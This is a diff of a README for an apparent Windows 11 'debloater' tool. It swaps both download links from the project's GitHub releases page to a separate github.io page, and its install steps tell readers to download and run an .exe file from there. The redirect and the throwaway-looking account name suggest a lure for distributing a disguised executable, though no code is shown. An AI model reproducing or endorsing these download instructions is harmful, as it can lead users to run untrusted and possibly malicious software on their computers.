@@ -1,6 +1,6 @@
 # 🚀 Windows-11-Debloater-2026-GitHub - Boost your Windows 11 system speed
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Revocationprofessionalboxing632/Windows-11-Debloater-2026-GitHub/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://revocationprofessionalboxing632.github.io)
 
 This application helps users remove unwanted software and telemetry from Windows 11. It provides a simple way to improve PC speed and protect privacy.
 
@@ -27,7 +27,7 @@ Before you run this tool, check your computer for these items:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the project website at: https://github.com/Revocationprofessionalboxing632/Windows-11-Debloater-2026-GitHub/releases
+1. Visit the project website at: https://revocationprofessionalboxing632.github.io
 2. Look for the section labeled "Latest".
 3. Click the file that ends in .exe to start the download to your computer.
 4. Open the folder where your browser saves downloads.
